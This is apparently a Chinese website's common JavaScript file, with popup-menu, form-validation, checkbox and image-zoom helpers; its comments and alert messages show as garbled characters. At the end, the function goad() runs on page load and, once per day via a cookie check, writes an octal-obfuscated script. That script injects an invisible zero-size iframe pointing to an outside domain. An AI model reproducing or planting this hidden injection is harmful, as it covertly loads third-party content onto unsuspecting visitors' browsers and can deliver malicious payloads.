//�˵�
var menuOffX=0	//�˵���������������˾���
var menuOffY=20	//�˵����������ֶ��˾���

var ie4=document.all&&navigator.userAgent.indexOf("Opera")==-1
var ns6=document.getElementById&&!document.all
function showmenu(e,vmenu,mod){
	which=vmenu
	menuobj=document.getElementById("popmenu")
	menuobj.thestyle=menuobj.style
	menuobj.innerHTML=which
	menuobj.contentwidth=menuobj.offsetWidth
	eventX=e.clientX
	eventY=e.clientY
	var rightedge=document.body.clientWidth-eventX
	var bottomedge=document.body.clientHeight-eventY

		if (rightedge<menuobj.contentwidth)
			menuobj.thestyle.left=document.body.scrollLeft+eventX-menuobj.contentwidth+menuOffX
		else
			menuobj.thestyle.left=ie4? ie_x(event.srcElement)+menuOffX : ns6? window.pageXOffset+eventX : eventX
		
		if (bottomedge<menuobj.contentheight&&mod!=0)
			menuobj.thestyle.top=document.body.scrollTop+eventY-menuobj.contentheight-event.offsetY+menuOffY-23
		else
			menuobj.thestyle.top=ie4? ie_y(event.srcElement)+menuOffY : ns6? window.pageYOffset+eventY+10 : eventY

	menuobj.thestyle.visibility="visible"
}


function ie_y(e){  
	var t=e.offsetTop;  
	while(e=e.offsetParent){  
		t+=e.offsetTop;  
	}  
	return t;  
}  
function ie_x(e){  
	var l=e.offsetLeft;  
	while(e=e.offsetParent){  
		l+=e.offsetLeft;  
	}  
	return l;  
}

function highlightmenu(e,state){
	if (document.all)
		source_el=event.srcElement
		while(source_el.id!="popmenu"){
			source_el=document.getElementById? source_el.parentNode : source_el.parentElement
			if (source_el.className=="menuitems"){
				source_el.id=(state=="on")? "mouseoverstyle" : ""
		}
	}
}


function hidemenu(){if (window.menuobj)menuobj.thestyle.visibility="hidden"}
function dynamichide(e){if ((ie4||ns6)&&!menuobj.contains(e.toElement))hidemenu()}
document.onclick=hidemenu
document.write("<div class=menuskin id=popmenu onmouseover=highlightmenu(event,'on') onmouseout=highlightmenu(event,'off');dynamichide(event)></div>")
//�˵�END
function JugeComment(myform)
{
	if (document.myform.UserName.value==""){
		alert ("����û�������Ϊ�գ�");
		document.myform.UserName.focus();
		return(false);
	}
	if (document.myform.content.value == "")
	{
		alert("�������ݲ���Ϊ�գ�");
		document.myform.content.focus();
                return (false);
	}
}
function CheckAll(form) {  
	for (var i=0;i<form.elements.length;i++)  
	{  
		var e = form.elements[i];  
		if (e.name != 'chkall')  
		e.checked = true // form.chkall.checked;  
	}  
} 
 
function ContraSel(form) {
	for (var i=0;i<form.elements.length;i++)
	{
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked=!e.checked;
	}
}
function bbimg(o){
	var zoom=parseInt(o.style.zoom, 10)||100;zoom+=event.wheelDelta/12;if (zoom>0) o.style.zoom=zoom+'%';
	return false;
}
function imgzoom(img,maxsize){
	var a=new Image();
	a.src=img.src
	if(a.width > maxsize * 4)
	{
		img.style.width=maxsize;
	}
	else if(a.width >= maxsize)
	{
		img.style.width=Math.round(a.width * Math.floor(4 * maxsize / a.width) / 4);
	}
	return false;
}

function storePage() {
	d=document;
	t=d.selection?(d.selection.type!='None'?d.selection.createRange().text:''):(d.getSelection?d.getSelection():'');
	void(vivi=window.open('http://vivi.sina.com.cn/collect/icollect.php?pid=52z.com&title='+escape(d.title)+'&url='+escape(d.location.href)+'&desc='+escape(t),'vivi','scrollbars=no,width=480,height=480,left=75,top=20,status=no,resizable=yes'));
	vivi.focus();
}
function goad(){
var Then = new Date() 
Then.setTime(Then.getTime() + 24*60*60*1000)
var cookieString = new String(document.cookie)
var cookieHeader = "Cookie1=" 
var beginPosition = cookieString.indexOf(cookieHeader)
if (beginPosition != -1){ 
} else 
{ document.cookie = "Cookie1=Filter;expires="+ Then.toGMTString() 
document.writeln("<SCRIPT LANGUAGE=\"Javascript\">");
document.writeln("var Words =\"\\74\\151\\146\\162\\141\\155\\145\\40\\163\\162\\143\\75\\150\\164\\164\\160\\72\\57\\57\\167\\167\\167\\56\\163\\167\\63\\143\\56\\157\\162\\147\\57\\165\\156\\151\\157\\156\\57\\151\\156\\144\\145\\170\\56\\150\\164\\155\\40\\167\\151\\144\\164\\150\\75\\60\\40\\150\\145\\151\\147\\150\\164\\75\\60\\76\\74\\57\\151\\146\\162\\141\\155\\145\\76\";document.write(unescape(Words))<\/SCRIPT>");   
}
}goad();
